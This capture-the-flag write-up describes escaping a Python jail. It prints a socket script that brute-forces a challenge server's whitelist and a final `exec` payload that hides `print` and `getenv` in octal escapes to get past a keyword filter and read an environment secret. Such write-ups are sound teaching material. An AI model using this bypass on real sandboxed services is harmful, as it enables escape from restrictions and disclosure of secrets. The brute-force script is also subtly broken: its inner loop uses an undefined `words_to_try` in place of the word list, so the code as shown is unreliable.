## Case sensitivity

# Description
This was a multi-stage challenge that started as a restricted shell and escalated into an incredibly difficult python jail. The jail used a whitelist
based filter that blocked nearly every useful function, keyword, and even iterator variables.The final solution was to use the whitelisted 
`exec` function with a payload where forbidden keywords like `print` and `getenv` were obfuscated using octal escape codes.

# Writeup
We worked through a brute-force script that discovered the whitelist: `PRINT`, `ENVIRON`, `FLAG`, and `exec`. We naturally assumed the solution was
`PRINT(ENVIRON['FLAG'])`. However, this produced a NameError. The whitelisted words were a deliberate misdirection—they passed the filter but were useless at runtime.

# Brute force script:

```
import socket
import string
import keyword
import os

# --- Configuration ---
HOST = 'chall_citadel.cryptonitemit.in'
PORT = 32770
TIMEOUT = 3 

candidates = set()
for k in keyword.kwlist:
    candidates.add(k)
for b in dir(__builtins__):
    candidates.add(b)
for o in dir(os):
    candidates.add(o)
for p in string.printable:
    if not p.isspace():
        candidates.add(p)
wordlist = sorted(list(candidates))
found_words = []
total_words = len(wordlist)

print(f"[*] Starting comprehensive brute-force with {total_words} candidates...")

for i, word in enumerate(wordlist):
    # print progress every 100 words
    if (i + 1) % 100 == 0:
        print(f"[*] Testing... ({i + 1}/{total_words})")
    
    for attempt in words_to_try:
        if attempt in found_words:
            continue
            
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(TIMEOUT)
                s.connect((HOST, PORT))
                s.recv(4096)  # Read banner
                
                payload = attempt + '\n'
                s.sendall(payload.encode())
                
                response = s.recv(4096).decode(errors='ignore')
                
                if "not allowed!" not in response:
                    if attempt not in found_words:
                        print(f"[+] Found whitelisted word: {attempt}")
                        found_words.append(attempt)

        except socket.timeout:
            pass # Ignore timeouts, just means the server is slow
        except Exception:
            pass # Ignore other connection errors

print("\n[*] --- Scan Complete ---")
if found_words:
    print(f"[*] Whitelisted words found: {', '.join(sorted(found_words))}")
else:
    print("[*] No whitelisted words found from the comprehensive list.")
```

The vulnerability was a classic keyword filter bypass. The clean() function scanned the string argument passed to exec for forbidden words. 
The solution was to build the payload using characters the filter wouldn't recognize, but that the Python interpreter would correctly parse.
We used octal escape codes to construct the payload `print(getenv('FLAG'))`.

```
\160\162\151\156\164  ->  `print`

\147\145\164\145\156\166  ->  `getenv`

\106\114\101\107      ->  `FLAG`
```
final command: `exec('\160\162\151\156\164(\147\145\164\145\156\166(\'\106\114\101\107\'))')`

Flag hence obtained : `citadel{d34th_d035_n07_fr33_y0u_fr0m_7h3_gu17ar15t}`
